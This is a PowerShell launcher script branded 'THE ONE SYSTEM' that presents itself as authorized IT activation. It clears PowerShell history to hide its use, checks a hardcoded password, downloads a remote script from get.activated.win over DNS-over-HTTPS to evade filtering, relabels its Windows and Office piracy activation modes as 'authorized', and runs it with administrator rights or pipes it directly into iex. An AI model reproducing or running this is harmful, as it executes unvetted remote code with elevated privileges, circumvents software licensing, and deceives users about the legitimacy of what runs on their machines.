# launcher.ps1 - THE ONE SYSTEM
# Authorized IT Execution Script

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- STEALTH MODULE ---
Clear-History
try { $psHistoryPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath; if ($psHistoryPath -and (Test-Path $psHistoryPath)) { Clear-Content -Path $psHistoryPath -ErrorAction SilentlyContinue } } catch {}

# Fetch local hardware data
$localIp = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred | Where-Object InterfaceAlias -NotMatch 'Loopback' | Select-Object -First 1).IPAddress
try { $macAddress = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress } catch { $macAddress = "UNKNOWN" }

# PASSWORD PROMPT
$password = Read-Host "key" -AsSecureString
$passString = ""
if ($password -ne $null -and $password.Length -gt 0) {
    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
    $passString = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
}
if ($passString -ne "8888") { Write-Host "`n[!] ACCESS DENIED" -ForegroundColor Red; Start-Sleep -Seconds 2; exit }

# ---------------------------------------------------------
# UI DISPLAY
# ---------------------------------------------------------
Clear-Host
Write-Host "`n  T H E   O N E   S Y S T E M S" -ForegroundColor Cyan
Write-Host "  Authorized Operations Terminal" -ForegroundColor DarkGray
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  MAC Address: $macAddress" -ForegroundColor White
Write-Host "  Local IP   : $localIp" -ForegroundColor White
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  Available Modules:" -ForegroundColor Gray
Write-Host "  [ 1 ] Activate THE ONE Windows Authorized" -ForegroundColor White
Write-Host "  [ 2 ] Install THE ONE Authorized Office" -ForegroundColor White
Write-Host "  [ 3 ] THE ONE PC optimization" -ForegroundColor White
Write-Host "  [ 4 ] Direct Bypass (Repair)" -ForegroundColor DarkCyan
Write-Host "  [ 0 ] Exit Terminal" -ForegroundColor DarkGray
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host "`n  > Select module: " -NoNewline

$key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character
Write-Host "$key" -ForegroundColor White

# Logic for downloading via Bypass (Stable)
function Invoke-BrandedActivation {
    param($ArgsInput)
    Write-Host "`n  [+] Establishing secure channel via DNS Bypass..." -ForegroundColor Cyan
    $tempPath = "$env:TEMP\THE_ONE_RUN.cmd"
    try {
        # Using curl bypass to get the AIO script
        curl.exe -s --doh-url https://1.1.1.1/dns-query https://get.activated.win | Out-File "$tempPath" -Encoding ascii
        
        # Inject Custom Branding
        $content = Get-Content "$tempPath" -Raw
        $content = $content -replace 'color 07', 'color 0B'
        $content = $content -ireplace 'title\s+.*', 'title THE ONE AUTHORIZE [SYSTEM]'
        $content = $content -replace '\[1\] HWID', '[1] THE ONE WINDOWS AUTHORIZED'
        $content = $content -replace '\[2\] Ohook', '[2] THE ONE OFFICE ACTIVATION'
        Set-Content -Path $tempPath -Value $content -Encoding ascii
        
        # Execute
        Start-Process "$tempPath" -ArgumentList $ArgsInput -Verb RunAs -Wait
        Remove-Item -Path $tempPath -ErrorAction SilentlyContinue
    } catch {
        Write-Host "  [-] Connection failure. DNS Bypass failed." -ForegroundColor Red
        Start-Sleep -Seconds 3
    }
}

switch ($key) {
    '1' { Invoke-BrandedActivation "/HWID" }
    '2' { Invoke-BrandedActivation "/Ohook" }
    '3' {
        Write-Host "`n  [+] Optimizing..." -ForegroundColor Cyan
        Get-ChildItem -Path $env:TEMP -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
        Write-Host "  [+] PC Optimized." -ForegroundColor Green
        Start-Sleep -Seconds 2
    }
    '4' {
        Write-Host "`n  [+] Initializing DNS Bypass..." -ForegroundColor Cyan
        iex (curl.exe -s --doh-url https://1.1.1.1/dns-query https://get.activated.win | Out-String)
    }
    default { exit }
}
